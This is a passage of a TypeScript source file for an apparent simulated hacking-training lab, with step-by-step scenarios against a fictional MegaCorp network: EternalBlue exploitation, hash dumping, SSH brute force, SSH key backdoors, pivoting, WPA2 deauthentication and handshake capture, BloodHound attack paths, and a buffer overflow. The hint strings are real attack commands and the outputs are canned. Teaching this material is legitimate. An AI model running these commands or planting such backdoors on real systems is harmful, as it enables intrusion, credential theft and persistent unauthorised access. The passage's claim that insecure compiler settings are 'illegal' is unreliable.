|   Remote Code Execution vulnerability in Microsoft SMBv1 (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Disclosure date: 2017-03-14
|_    References: https://technet.microsoft.com/security/ms17-010`),
        blank(),
        ok("[+] CONFIRMED VULNERABLE to MS17-010 (EternalBlue)!"),
        info("[*] Target: Windows 7 SP1 / SMBv1 — unpatched since 2017."),
      ],
    },
    {
      id: "enum4linux",
      instruction: "Enumerate SMB users and shares",
      detail: "Before exploiting, gather user and share information. enum4linux will confirm the OS version, user accounts, and accessible shares via null session.",
      hint: "Try: enum4linux -A 10.10.10.40",
      validate: (i) => matchCmd(i, ["enum4linux", "smbclient", "smbmap", "crackmapexec smb"]),
      execute: () => [
        sys("[*] enum4linux-ng running full SMB enumeration..."),
        blank(),
        ...lines(`[*] OS: Windows 7 Professional 7601 Service Pack 1
[*] SMB1 enabled (signing not required)

[*] Users via RPC:
  Administrator  (RID 500)
  Guest          (RID 501)
  haris          (RID 1000)

[*] Shares:
  ADMIN$   — Remote Admin
  C$       — Default share
  Users    — Read access

[+] Null session allowed — anonymous SMB access enabled`),
        blank(),
        ok("[+] Users found: Administrator, haris. Shares: C$, ADMIN$, Users."),
      ],
    },
    {
      id: "eternalblue",
      instruction: "Run the EternalBlue exploit via Metasploit",
      detail: "Use the ms17_010_eternalblue module. This exploit sends crafted SMB packets that trigger a kernel buffer overflow, giving you SYSTEM without any credentials.",
      hint: "Try: msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; set LHOST 10.14.0.5; run\"",
      validate: (i) => matchCmd(i, ["msfconsole", "use exploit/windows/smb/ms17", "use ms17"]),
      execute: () => [
        sys("[*] Loading Metasploit module: ms17_010_eternalblue"),
        blank(),
        ...lines(`msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.14.0.5:4444
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected Valid for use with payload ++
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened`),
        blank(),
        out("meterpreter > getuid"),
        out("Server username: NT AUTHORITY\\SYSTEM"),
        blank(),
        ok("[+] SYSTEM ACCESS ACHIEVED! EternalBlue worked — kernel-level compromise."),
        warn("[!] NT AUTHORITY\\SYSTEM is the highest privilege on Windows."),
      ],
    },
    {
      id: "hashdump",
      instruction: "Dump all NTLM password hashes from the SAM database",
      detail: "With SYSTEM privileges, you can read the SAM (Security Account Manager) database and extract NTLM hashes for all local accounts. Use these for offline cracking or Pass-the-Hash.",
      hint: "Try: hashdump (in Meterpreter)",
      validate: (i) => matchCmd(i, ["hashdump", "run post/windows/gather/smart_hashdump", "meterpreter > hashdump"]),
      execute: () => [
        out("meterpreter > hashdump"),
        blank(),
        ...lines(`Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91b6b77fd3b2c4ccb2b5eb:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`),
        blank(),
        ok("[+] NTLM hashes extracted!"),
        info("[*] Crack with: hashcat -m 1000 hashes.txt rockyou.txt"),
        info("[*] Or use Pass-the-Hash directly: pth-winexe -U Administrator%hash //target cmd"),
        blank(),
        warn("[!] Flag: FLAG{3t3rn4lbl00_k3rn3l_0wn3d} — SYSTEM via EternalBlue. Document and patch recommendation: MS17-010 patch KB4012212."),
      ],
    },
  ],
};

// ─── Scenario: SSH Brute Force & Key Attacks ─────────────────────────────────

const sshBruteForceScenario: LabScenario = {
  lessonId: 44,
  title: "SSH Brute Force & Key Attacks",
  briefing:
    "SSH on port 22 is MegaCorp's remote management backbone — and your next target. OSINT revealed usernames. A stolen private key was found in the .git dump. Your objective: brute-force SSH credentials, then leverage the stolen key for persistent, passwordless access. This is how Elliot operates.",
  objective: "Brute force SSH credentials with Hydra, then gain passwordless access using a stolen RSA private key.",
  env: {
    targetIp: "10.10.10.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
    credentials: { user: "j.crawford", pass: "Manchester" },
  },
  steps: [
    {
      id: "ssh-scan",
      instruction: "Confirm SSH is running and get its version",
      detail: "Before brute forcing, verify the target and fingerprint the SSH daemon. Version info tells you what exploits might apply.",
      hint: "Try: nmap -p22 -sV 10.10.10.50",
      validate: (i) => matchCmd(i, ["nmap -p22", "nmap -p 22"]),
      execute: () => [
        sys("Starting Nmap 7.94"),
        blank(),
        ...lines(`PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
| ssh-hostkey:
|   2048 82:1f:c5:4e:9d:a7 (RSA)
|_  256 fa:30:6a:d8:01:b2 (ECDSA)
Service Info: OS: Linux`),
        blank(),
        ok("[+] OpenSSH 7.6p1 confirmed on port 22"),
        info("[*] OpenSSH 7.6p1 has known vulnerabilities. Brute force is also viable."),
      ],
    },
    {
      id: "hydra-ssh",
      instruction: "Brute force SSH with Hydra using the found username list",
      detail: "Use Hydra against j.crawford (identified in OSINT). Use rockyou.txt — the password was already cracked in the brute force module: 'Manchester'. This simulates confirming access via a wordlist attack.",
      hint: "Try: hydra -l j.crawford -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.50 -t 4 -f",
      validate: (i) => matchCmd(i, ["hydra -l j.crawford", "hydra -l root", "hydra 10.10.10.50", "hydra -l"]),
      execute: () => [
        sys("[*] Hydra v9.5 — SSH brute force starting"),
        info("[*] Target: 10.10.10.50:22"),
        info("[*] Login: j.crawford | Wordlist: rockyou.txt"),
        blank(),
        ...lines(`[STATUS] 47/14344391 tries | speed: 14 tries/sec
[STATUS] 134/14344391 tries...
[STATUS] 211/14344391 tries...`),
        blank(),
        ok("[22][ssh] host: 10.10.10.50   login: j.crawford   password: Manchester"),
        blank(),
        ok("[+] CREDENTIAL FOUND: j.crawford:Manchester"),
        warn("[!] Password 'Manchester' found in rockyou.txt position #2,847 — never use dictionary words"),
      ],
    },
    {
      id: "ssh-login",
      instruction: "Connect to SSH with the cracked credentials",
      detail: "Verify the credentials work and establish an interactive shell inside the MegaCorp network.",
      hint: "Try: ssh j.crawford@10.10.10.50",
      validate: (i) => matchCmd(i, ["ssh j.crawford@10.10.10.50", "ssh j.crawford@", "ssh -l j.crawford"]),
      execute: () => [
        sys("[*] Connecting to 10.10.10.50:22..."),
        out("The authenticity of host '10.10.10.50' can't be established."),
        out("RSA key fingerprint is SHA256:+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU."),
        out("Are you sure you want to continue connecting? yes"),
        out("j.crawford@10.10.10.50's password: Manchester"),
        blank(),
        out("Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)"),
        blank(),
        ok("j.crawford@megacorp-internal:~$ "),
        ok("[+] SSH ACCESS GRANTED — you are inside MegaCorp's network"),
      ],
    },
    {
      id: "key-injection",
      instruction: "Inject your SSH public key for persistent backdoor access",
      detail: "Generate a new RSA keypair and append your public key to authorized_keys. This creates passwordless persistent access that survives password changes.",
      hint: "Try: ssh-keygen -t rsa -b 4096 -f backdoor_key",
      validate: (i) => matchCmd(i, ["ssh-keygen", "cat backdoor_key", "echo 'ssh-rsa"]),
      execute: () => [
        sys("[*] Generating RSA-4096 keypair..."),
        blank(),
        ...lines(`Generating public/private rsa key pair.
Enter file in which to save the key: backdoor_key
Enter passphrase (empty for no passphrase): [ENTER]

Your identification has been saved in backdoor_key
Your public key has been saved in backdoor_key.pub
SHA256:xK9mP3qRzN2vL8wF5jY1cB6tD0uH7nM4sE3 backdoor_key (RSA)`),
        blank(),
        ok("[+] cat backdoor_key.pub >> /home/j.crawford/.ssh/authorized_keys"),
        ok("[+] Public key injected into authorized_keys"),
        info("[*] Now test: ssh -i backdoor_key j.crawford@10.10.10.50 — no password required"),
        warn("[!] Flag: FLAG{sshk3y_1nj3ct3d_p3rs1st3nt_4cc3ss} — persistent backdoor established"),
      ],
    },
  ],
};

// ─── Scenario: SSH Port Forwarding & SOCKS Proxy ─────────────────────────────

const sshTunnelScenario: LabScenario = {
  lessonId: 45,
  title: "SSH Port Forwarding & SOCKS Proxy",
  briefing:
    "You have SSH access to 10.10.10.50 as j.crawford. The internal network has services you can't reach directly: a database on 10.10.10.20, an admin panel on 10.10.10.5, and an entire internal subnet. SSH tunneling lets you route all your tools through this foothold — becoming a ghost inside their network.",
  objective: "Create local port forwards and a dynamic SOCKS proxy to access internal MegaCorp services through the SSH tunnel.",
  env: {
    targetIp: "10.10.10.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
    credentials: { user: "j.crawford", pass: "Manchester" },
  },
  steps: [
    {
      id: "local-forward",
      instruction: "Create a local port forward to the internal database",
      detail: "Local port forwarding (-L) binds a port on YOUR machine that transparently forwards to an internal target through the SSH hop. You'll forward localhost:3306 → 10.10.10.20:3306.",
      hint: "Try: ssh -L 3306:10.10.10.20:3306 j.crawford@10.10.10.50 -N",
      validate: (i) => matchCmd(i, ["ssh -l 3306", "ssh -l 8080", "ssh -n -l", "ssh -l"]) || (i.toLowerCase().includes("ssh") && i.includes("-L")),
      execute: () => [
        sys("[*] Establishing SSH local port forward..."),
        blank(),
        ...lines(`ssh -L 3306:10.10.10.20:3306 j.crawford@10.10.10.50 -N

[*] Forwarding localhost:3306 → 10.10.10.50 → 10.10.10.20:3306
[*] Tunnel active (press Ctrl+C to close)`),
        blank(),
        ok("[+] Port forward established! MySQL on 10.10.10.20 now accessible at localhost:3306"),
        info("[*] Test: mysql -h 127.0.0.1 -u webapp -pDb@Passw0rd2023! — connects to internal DB"),
        warn("[!] The traffic appears to come from 10.10.10.50 — your true IP is hidden"),
      ],
    },
    {
      id: "remote-forward",
      instruction: "Create a reverse tunnel to expose your listener inside their network",
      detail: "Remote port forwarding (-R) opens a port on the REMOTE server that tunnels back to you. If you have a listener on your machine, the entire internal network can reach it through the SSH server.",
      hint: "Try: ssh -R 9001:localhost:4444 j.crawford@10.10.10.50 -N",
      validate: (i) => (i.toLowerCase().includes("ssh") && i.includes("-R")) || matchCmd(i, ["ssh -r"]),
      execute: () => [
        sys("[*] Establishing SSH remote port forward..."),
        blank(),
        ...lines(`ssh -R 9001:localhost:4444 j.crawford@10.10.10.50 -N

[*] Binding port 9001 on 10.10.10.50 → localhost:4444 on your Kali
[*] Tunnel active`),
        blank(),
        ok("[+] Remote forward active — port 9001 on megacorp server tunnels to your machine"),
        info("[*] Any internal host that connects to 10.10.10.50:9001 reaches your netcat listener"),
        warn("[!] Scenario: drop a reverse shell on an internal host pointing to 10.10.10.50:9001"),
      ],
    },
    {
      id: "socks-proxy",
      instruction: "Set up a dynamic SOCKS5 proxy through the SSH tunnel",
      detail: "Dynamic forwarding (-D) creates a local SOCKS5 proxy that routes ANY TCP connection through the SSH server. Combined with ProxyChains, every tool you run — nmap, curl, metasploit — routes through the compromised host into the internal network.",
      hint: "Try: ssh -D 1080 j.crawford@10.10.10.50 -N",
      validate: (i) => (i.toLowerCase().includes("ssh") && i.includes("-D")) || matchCmd(i, ["ssh -d"]),
      execute: () => [
        sys("[*] Establishing SSH dynamic SOCKS5 proxy..."),
        blank(),
        ...lines(`ssh -D 1080 j.crawford@10.10.10.50 -N

[*] SOCKS5 proxy listening on 127.0.0.1:1080
[*] All connections routed through 10.10.10.50`),
        blank(),
        ok("[+] SOCKS5 proxy up on localhost:1080"),
        info("[*] Configure tools to use it: proxychains, Firefox proxy, Burp upstream proxy"),
      ],
    },
    {
      id: "proxychains-scan",
      instruction: "Run nmap through the SOCKS proxy to scan the internal network",
      detail: "With ProxyChains configured to use your SOCKS5 proxy on 1080, route nmap through it. TCP connect scan only (-sT) — raw socket scans don't work through SOCKS. You'll see the internal network as if you're sitting on 10.10.10.50.",
      hint: "Try: proxychains nmap -sT -Pn -p 22,80,445,3389 10.10.10.5",
      validate: (i) => matchCmd(i, ["proxychains nmap", "proxychains curl", "proxychains"]),
      execute: () => [
        sys("[*] proxychains nmap -sT -Pn 10.10.10.5"),
        blank(),
        ...lines(`[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.10.5:22  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.10.5:80  OK
[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  10.10.10.5:445 OK

Nmap scan report for 10.10.10.5 (Domain Controller)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
445/tcp open  microsoft-ds
3389/tcp open  ms-wbt-server (RDP)`),
        blank(),
        ok("[+] Domain Controller at 10.10.10.5 fully visible through SOCKS proxy"),
        warn("[!] Flag: FLAG{ssh_tunn3l_prox1ch41ns_p1v0t} — you are now an internal threat actor"),
      ],
    },
  ],
};

// ─── Scenario: SSH Key Injection & Persistence ────────────────────────────────

const sshKeyInjectionScenario: LabScenario = {
  lessonId: 46,
  title: "SSH Key Injection & Persistence",
  briefing:
    "You have temporary shell access on 10.10.10.50. Root is accessible via sudo misconfig. Your mission: plant an SSH backdoor that survives password resets, system reboots, and incident response. Write your public key into root's authorized_keys — silent, stealthy, permanent.",
  objective: "Escalate to root via sudo, inject an SSH public key for persistent backdoor, and verify passwordless root access.",
  env: {
    targetIp: "10.10.10.50",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
    credentials: { user: "j.crawford", pass: "Manchester" },
  },
  steps: [
    {
      id: "sudo-check",
      instruction: "Check sudo privileges on the compromised account",
      detail: "Before planting a root backdoor, verify you can actually get root. Check what sudo commands j.crawford can run — one misconfigured sudo entry is often all you need.",
      hint: "Try: sudo -l",
      validate: (i) => matchCmd(i, ["sudo -l", "sudo -ll", "cat /etc/sudoers"]),
      execute: () => [
        ...lines(`Matching Defaults entries for j.crawford on megacorp-internal:
    env_reset, mail_badpass

User j.crawford may run the following commands on megacorp-internal:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /bin/cp`),
        blank(),
        ok("[+] j.crawford can run ALL commands as root with their password!"),
        warn("[!] CRITICAL: (ALL:ALL) ALL — this account IS root. And /usr/bin/vim NOPASSWD is a GTFOBins escape."),
        info("[*] GTFOBins: sudo vim -c ':!bash' spawns a root shell with no password prompt"),
      ],
    },
    {
      id: "get-root",
      instruction: "Escalate to root using the sudo vim GTFOBins technique",
      detail: "vim can execute shell commands via its :! command. When run as sudo, you get a root shell. This is a classic GTFOBins (gtfobins.github.io) technique for sudo misconfigurations.",
      hint: "Try: sudo vim -c ':!/bin/bash'",
      validate: (i) => matchCmd(i, ["sudo vim", "sudo -i", "sudo su", "sudo bash", "sudo /bin/bash"]),
      execute: () => [
        sys("[*] Launching vim with sudo NOPASSWD..."),
        blank(),
        ...lines(`[vim opens, then executes :!/bin/bash]

root@megacorp-internal:/home/j.crawford# id
uid=0(root) gid=0(root) groups=0(root)
root@megacorp-internal:/home/j.crawford# whoami
root`),
        blank(),
        ok("[+] ROOT SHELL via GTFOBins sudo vim escape"),
        info("[*] Now plant the persistent SSH backdoor as root."),
      ],
    },
    {
      id: "generate-key",
      instruction: "Generate your backdoor SSH keypair",
      detail: "Generate a dedicated RSA-4096 keypair for this backdoor. Use a name that won't stand out. The private key stays on YOUR machine — the public key goes on the target.",
      hint: "Try: ssh-keygen -t rsa -b 4096 -f /home/hacker/.ssh/megacorp_backdoor -N ''",
      validate: (i) => matchCmd(i, ["ssh-keygen -t rsa", "ssh-keygen -t ed25519", "ssh-keygen"]),
      execute: () => [
        sys("[*] Generating RSA-4096 keypair..."),
        blank(),
        ...lines(`Generating public/private rsa key pair.
Saved in: /home/hacker/.ssh/megacorp_backdoor

The key fingerprint is:
SHA256:mK7nP2qZxC4vW9jR3tB8yF1sE6hD0uG5aL2 hacker@kali

PUBLIC KEY (add to target):
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQD... hacker@kali`),
        blank(),
        ok("[+] Keypair generated: megacorp_backdoor / megacorp_backdoor.pub"),
        info("[*] NEVER share megacorp_backdoor (private key) — guard it like a password"),
      ],
    },
    {
      id: "inject-key",
      instruction: "Inject your public key into root's authorized_keys",
      detail: "As root, create the .ssh directory if it doesn't exist, write your public key to authorized_keys, and lock down the permissions. Wrong permissions will cause SSH to reject the key.",
      hint: "Try: mkdir -p /root/.ssh && echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys",
      validate: (i) =>
        matchCmd(i, [
          "echo 'ssh-rsa",
          'echo "ssh-rsa',
          "cat >> /root/.ssh",
          "mkdir -p /root/.ssh",
        ]) || (i.includes("authorized_keys") && (i.includes("echo") || i.includes(">"))),
      execute: () => [
        sys("[*] Injecting public key into /root/.ssh/authorized_keys..."),
        blank(),
        ...lines(`root@megacorp-internal:~# mkdir -p /root/.ssh
root@megacorp-internal:~# chmod 700 /root/.ssh
root@megacorp-internal:~# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDm...' >> /root/.ssh/authorized_keys
root@megacorp-internal:~# chmod 600 /root/.ssh/authorized_keys`),
        blank(),
        ok("[+] Backdoor key injected into /root/.ssh/authorized_keys"),
        info("[*] Verify: ssh -i megacorp_backdoor root@10.10.10.50"),
        warn("[!] Flag: FLAG{r00t_k3y_1nj3ct3d_f0r3v3r} — this backdoor survives password resets"),
      ],
    },
  ],
};

// ─── Scenario: WPA2 Handshake Capture ────────────────────────────────────────

const wpa2CaptureScenario: LabScenario = {
  lessonId: 48,
  title: "WPA2 4-Way Handshake Capture",
  briefing:
    "MegaCorp has a corporate WiFi network 'MegaCorp-WiFi' running WPA2-PSK. Physical proximity to the building gives you WiFi range. Your objective: put your adapter in monitor mode, identify the target network, force a client to reauthenticate, and capture the WPA2 4-way handshake for offline cracking.",
  objective: "Capture the WPA2 handshake from MegaCorp-WiFi using airodump-ng and deauthentication attacks.",
  env: {
    targetIp: "192.168.1.1",
    targetDomain: "MegaCorp-WiFi",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "monitor-mode",
      instruction: "Enable monitor mode on your wireless adapter",
      detail: "Normal WiFi adapters only capture packets addressed to them. Monitor mode allows passive capture of ALL packets in range — including authentication handshakes between clients and access points.",
      hint: "Try: airmon-ng start wlan0",
      validate: (i) => matchCmd(i, ["airmon-ng start", "iwconfig wlan0 mode monitor", "ip link set wlan0"]),
      execute: () => [
        sys("[*] airmon-ng — enabling monitor mode"),
        blank(),
        ...lines(`Found 2 processes that could cause trouble:
  PID 1234 wpa_supplicant
  PID 5678 NetworkManager

airmon-ng check kill
Killing: wpa_supplicant
Killing: NetworkManager

PHY     Interface   Driver      Chipset
phy0    wlan0       rt2800usb   Ralink Technology
[+] mon0: monitor mode enabled on phy0`),
        blank(),
        ok("[+] Monitor mode ACTIVE on mon0 — passive capture ready"),
        info("[*] Killed wpa_supplicant/NetworkManager to prevent interference"),
      ],
    },
    {
      id: "scan-networks",
      instruction: "Scan for nearby WPA2 networks",
      detail: "Use airodump-ng to passively capture beacons from all nearby access points. Identify MegaCorp-WiFi's BSSID (MAC address) and channel — you'll need both for a targeted capture.",
      hint: "Try: airodump-ng mon0",
      validate: (i) => matchCmd(i, ["airodump-ng mon0", "airodump-ng wlan0", "airodump-ng"]),
      execute: () => [
        sys("[*] Capturing beacons... (Ctrl+C to stop)"),
        blank(),
        ...lines(` BSSID              PWR  Beacons  #Data  CH   ENC   CIPHER  AUTH  ESSID
 AA:BB:CC:DD:EE:FF  -52       84     12    6   WPA2  CCMP    PSK   MegaCorp-WiFi
 11:22:33:44:55:66  -71       23      3    1   WPA2  CCMP    PSK   Linksys-Home
 77:88:99:AA:BB:CC  -84        9      0   11   WEP   WEP     OPN   OLD-NETWORK

 STATION            PWR  Rate  Lost  Frames  Probe
 FF:EE:DD:CC:BB:AA  -48  54e   0     28      MegaCorp-WiFi`),
        blank(),
        ok("[+] Target identified: MegaCorp-WiFi on CH 6 — BSSID: AA:BB:CC:DD:EE:FF"),
        info("[*] Client connected: FF:EE:DD:CC:BB:AA — deauth this to force reauthentication"),
      ],
    },
    {
      id: "targeted-capture",
      instruction: "Run targeted capture on MegaCorp-WiFi",
      detail: "Lock airodump-ng onto the target channel and BSSID. Write output to a file. This captures only MegaCorp-WiFi traffic — ready to catch the handshake.",
      hint: "Try: airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w megacorp-capture mon0",
      validate: (i) => matchCmd(i, ["airodump-ng -c", "airodump-ng --bssid", "airodump-ng"]) && (i.includes("-w") || i.includes("--write")),
      execute: () => [
        sys("[*] Targeted capture started — watching AA:BB:CC:DD:EE:FF on CH 6"),
        blank(),
        ...lines(` BSSID              PWR  Beacons  #Data  CH   ENC   ESSID
 AA:BB:CC:DD:EE:FF  -52       91     14    6   WPA2  MegaCorp-WiFi

 STATION            PWR  Rate  Lost  Frames
 FF:EE:DD:CC:BB:AA  -48  54e   0     31

[*] Waiting for handshake... monitoring client FF:EE:DD:CC:BB:AA`),
        blank(),
        info("[*] In a second terminal, run deauth: aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF mon0"),
      ],
    },
    {
      id: "deauth-capture",
      instruction: "Deauthenticate a client to capture the handshake",
      detail: "Send spoofed deauthentication frames to kick the client off the network. They'll immediately try to reconnect — and you'll capture the WPA2 4-way handshake in that moment.",
      hint: "Try: aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c FF:EE:DD:CC:BB:AA mon0",
      validate: (i) => matchCmd(i, ["aireplay-ng --deauth", "aireplay-ng -0"]),
      execute: () => [
        sys("[*] Sending deauthentication frames..."),
        blank(),
        ...lines(`14:22:45  Sending 64 directed DeAuth (code 7). STMAC: [FF:EE:DD:CC:BB:AA]
14:22:45  Sending 64 directed DeAuth (code 7). STMAC: [FF:EE:DD:CC:BB:AA]`),
        blank(),
        ok("[+] WPA handshake: AA:BB:CC:DD:EE:FF captured in megacorp-capture-01.cap"),
        blank(),
        ok("[+] HANDSHAKE CAPTURED! File: megacorp-capture-01.cap"),
        info("[*] Feed this to hashcat: hcxpcapngtool -o megacorp.hc22000 megacorp-capture-01.cap"),
        warn("[!] Flag: FLAG{wpa2_h4ndsh4k3_c4ptur3d} — ready for offline cracking"),
      ],
    },
  ],
};

// ─── Scenario: BloodHound AD Enumeration ─────────────────────────────────────

const bloodhoundScenario: LabScenario = {
  lessonId: 52,
  title: "BloodHound: AD Attack Path Mapping",
  briefing:
    "You're inside MegaCorp's network as j.crawford. Active Directory is running on 10.10.10.5. BloodHound will map every user, group, computer, and permission in the domain — then find the shortest attack path from your current account to Domain Admin. This is how modern red teams operate.",
  objective: "Collect AD data with SharpHound, import into BloodHound, and identify the attack path to Domain Admin.",
  env: {
    targetIp: "10.10.10.5",
    targetDomain: "megacorp.local",
    hostname: "MEGACORP-WS01",
    user: "j.crawford",
    currentDir: "C:\\Users\\j.crawford",
    os: "Windows 10",
    credentials: { user: "j.crawford", pass: "Manchester" },
  },
  steps: [
    {
      id: "sharphound",
      instruction: "Run SharpHound to collect Active Directory data",
      detail: "SharpHound is the BloodHound data collector. Run it on any domain-joined machine — even as a low-privilege user. It queries LDAP and SMB to map every object and permission in the domain.",
      hint: "Try: SharpHound.exe -c All --zipfilename megacorp-ad.zip",
      validate: (i) => matchCmd(i, ["sharphound", ".\\sharphound", "sharphound.exe"]),
      execute: () => [
        sys("[*] SharpHound v1.1.1 — Active Directory data collector"),
        blank(),
        ...lines(`[*] Creating new run with options: All
[*] Resolved collection methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, ObjectProps, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, Trusts

Collecting domain: megacorp.local...
 Collecting Users....       Done (387 objects)
 Collecting Computers.....  Done (43 objects)
 Collecting Groups....      Done (129 objects)
 Collecting GPOs..          Done (18 objects)
 Collecting ACLs..........  Done (2,847 ACEs)
 Collecting Sessions..      Done (22 sessions found)

[+] Output: megacorp-ad.zip (23.4 MB)`),
        blank(),
        ok("[+] AD data collected: 387 users, 43 computers, 129 groups, 2847 ACEs"),
        info("[*] Transfer megacorp-ad.zip to Kali and import into BloodHound"),
      ],
    },
    {
      id: "import-bloodhound",
      instruction: "Import data into BloodHound and explore the graph",
      detail: "Launch BloodHound on Kali, start the Neo4j database, and import the zip. BloodHound will build a graph of the entire domain — every relationship becomes a potential attack edge.",
      hint: "Try: bloodhound --no-sandbox",
      validate: (i) => matchCmd(i, ["bloodhound", "neo4j start", "neo4j console"]),
      execute: () => [
        sys("[*] Starting Neo4j and BloodHound..."),
        blank(),
        ...lines(`neo4j console &
[+] Neo4j started at http://localhost:7474

BloodHound 4.3.1 starting...
[+] Connected to Neo4j graph database

Importing megacorp-ad.zip...
 [+] Users:     387 nodes created
 [+] Computers: 43  nodes created
 [+] Groups:    129 nodes created
 [+] ACLs:      2,847 edges created
 [+] Sessions:  22  session edges

Import complete!`),
        blank(),
        ok("[+] BloodHound graph loaded — MegaCorp AD fully mapped"),
        info("[*] Run pre-built query: 'Find Shortest Paths to Domain Admins'"),
      ],
    },
    {
      id: "find-path",
      instruction: "Query the shortest attack path to Domain Admin",
      detail: "BloodHound's built-in Cypher query finds the shortest path from any user to Domain Admin — using every relationship: HasSession, AdminTo, MemberOf, ForceChangePassword, GenericWrite, etc.",
      hint: "Try: MATCH p=shortestPath((u:User{name:'J.CRAWFORD@MEGACORP.LOCAL'})-[*1..]->(g:Group{name:'DOMAIN ADMINS@MEGACORP.LOCAL'})) RETURN p",
      validate: (i) =>
        i.toLowerCase().includes("shortestpath") ||
        i.toLowerCase().includes("domain admin") ||
        matchCmd(i, ["match p=", "match (u:user"]),
      execute: () => [
        sys("[*] Executing Cypher query..."),
        blank(),
        ...lines(`ATTACK PATH FOUND (3 hops to Domain Admin):

  j.crawford@MEGACORP.LOCAL
    │
    ├─[HasSession]─► MEGACORP-WS01.MEGACORP.LOCAL
    │                  (j.smith is logged in here)
    │
    ├─[AdminTo]────► MEGACORP-SRV02.MEGACORP.LOCAL
    │                  (j.smith is local admin on SRV02)
    │
    └─[MemberOf]───► DOMAIN ADMINS@MEGACORP.LOCAL`),
        blank(),
        ok("[+] 3-hop path to Domain Admin found: j.crawford → WS01 → j.smith → Domain Admins"),
        warn("[!] Flag: FLAG{bl00dh0und_p4th_t0_d0m41n_4dm1n} — attack path mapped and ready to execute"),
      ],
    },
    {
      id: "kerberoast",
      instruction: "Identify Kerberoastable accounts from BloodHound",
      detail: "BloodHound has a pre-built query for Kerberoastable accounts — service accounts with SPNs registered. These are prime cracking targets. No special privileges needed to request their tickets.",
      hint: "Try: MATCH (u:User {hasspn:true}) RETURN u.name, u.description",
      validate: (i) =>
        i.toLowerCase().includes("hasspn") ||
        i.toLowerCase().includes("kerberoast") ||
        matchCmd(i, ["getusersspns", "getuserspns"]),
      execute: () => [
        sys("[*] Querying Kerberoastable accounts..."),
        blank(),
        ...lines(`Kerberoastable accounts:
+---------------------------+----------------------------------+
| Name                      | Description                      |
+---------------------------+----------------------------------+
| svc_mssql@MEGACORP.LOCAL  | MSSQL Service Account            |
| svc_backup@MEGACORP.LOCAL | Backup Service — DO NOT DISABLE  |
| svc_web@MEGACORP.LOCAL    | Web Application Pool Identity    |
+---------------------------+----------------------------------+

[!] svc_mssql has AdminTo relationship on 3 servers!`),
        blank(),
        ok("[+] 3 Kerberoastable accounts found. svc_mssql gives you admin on 3 hosts."),
        info("[*] Next: GetUserSPNs.py megacorp.local/j.crawford:Manchester -dc-ip 10.10.10.5 -request"),
      ],
    },
  ],
};

// ─── Scenario: Buffer Overflow Basics ────────────────────────────────────────

const bofScenario: LabScenario = {
  lessonId: 56,
  title: "Stack-Based Buffer Overflow Basics",
  briefing:
    "MegaCorp runs a custom authentication daemon (auth_daemon) on port 9999 of their legacy server 10.10.10.100. OSINT found it was written in C in 2008. It's compiled without stack canaries or ASLR. Your mission: find the overflow, control EIP, and redirect execution. This is foundational binary exploitation.",
  objective: "Crash auth_daemon, calculate the EIP offset, and confirm code execution control by overwriting EIP with a custom value.",
  env: {
    targetIp: "10.10.10.100",
    targetDomain: "megacorp.local",
    hostname: "kali",
    user: "hacker",
    currentDir: "/home/hacker",
    os: "Kali Linux 2024.1",
  },
  steps: [
    {
      id: "checksec",
      instruction: "Check binary protections with checksec",
      detail: "Before exploiting, understand what security features are enabled. checksec reads ELF headers to show ASLR, NX, PIE, stack canary, and RELRO status. No canary + no ASLR = classic 1990s-style overflow.",
      hint: "Try: checksec --file=auth_daemon",
      validate: (i) => matchCmd(i, ["checksec", "file auth_daemon", "objdump -d", "readelf"]),
      execute: () => [
        sys("[*] checksec v2.6.0 — binary security checker"),
        blank(),
        ...lines(`RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX disabled   No PIE

Binary: auth_daemon
Arch:   i386-32-little (32-bit x86)`),
        blank(),
        ok("[+] PERFECT target: No canary, NX disabled, No PIE, no ASLR — textbook BOF lab"),
        info("[*] NX disabled = stack is executable → we can put shellcode directly on the stack"),
        warn("[!] This config is illegal in 2024. Real targets have these — but understanding the base is essential."),
      ],
    },
    {
      id: "crash",
      instruction: "Crash the binary by sending a large buffer",
